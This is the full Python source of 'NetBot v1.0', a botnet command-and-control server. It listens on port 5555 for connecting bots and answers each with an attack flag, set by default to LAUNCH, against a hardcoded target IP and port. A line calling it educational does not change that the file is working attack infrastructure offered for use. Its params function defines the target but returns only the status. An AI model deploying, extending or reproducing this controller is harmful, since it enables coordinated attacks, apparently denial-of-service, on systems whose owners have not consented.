#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# Author	 : Shankar Narayana Damodaran
# Tool 		 : NetBot v1.0
# 
# Description	 : This is a command & control center client-server code.
#              		Should be used only for educational, research purposes and internal use only.
#



import socket
import threading
from termcolor import colored

print (""" ______             ______             
|  ___ \       _   (____  \       _    
| |   | | ____| |_  ____)  ) ___ | |_  
| |   | |/ _  )  _)|  __  ( / _ \|  _) 
| |   | ( (/ /| |__| |__)  ) |_| | |__ 
|_|   |_|\____)\___)______/ \___/ \___)1.0 from https://github.com/skavngr
                                       """)





# Set target and flags.
def params():
	ATTACK_TARGET_HOST = "192.168.0.109" # IP address of the machine to be attacked.
	ATTACK_TARGET_PORT = 80 # Port Number of the machine to be attacked.

#Status codes that has to be set from the below list. 
		# HALT - To stop attacks immediately.
		# LAUNCH - To immediately start the attack.
		# HOLD - Wait for command.
		# UPDATE - Update Client.

	ATTACK_STATUS = "LAUNCH" # Choose any one Flag from above
	
	return ATTACK_STATUS
	 

def threaded(c):
	while True:
		data = c.recv(1024)
		if not data:
			#print('\x1b[0;30;41m' + 'Bot is Offline!' + '\x1b[0m')
			print('\x1b[0;30;41m' + 'Bot is Offline!' + '\x1b[0m',' Disconnected from CCC :', c.getpeername()[0], ':', c.getpeername()[1])
			break
		c.send(params().encode())

	#c.close()


def Main():
	host = "0.0.0.0"
	port = 5555

	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.bind((host, port))
	s.listen(50)
	while True:

		c, addr = s.accept()
		#print('\x1b[0;30;42m' + 'Bot is Online!' + '\x1b[0m')
		print('\x1b[0;30;42m' + 'Bot is Online!' + '\x1b[0m',' Connected to CCC :', addr[0], ':', addr[1])

		threading.Thread(target=threaded, args=(c,)).start()
	s.close()


if __name__ == '__main__':
	Main()
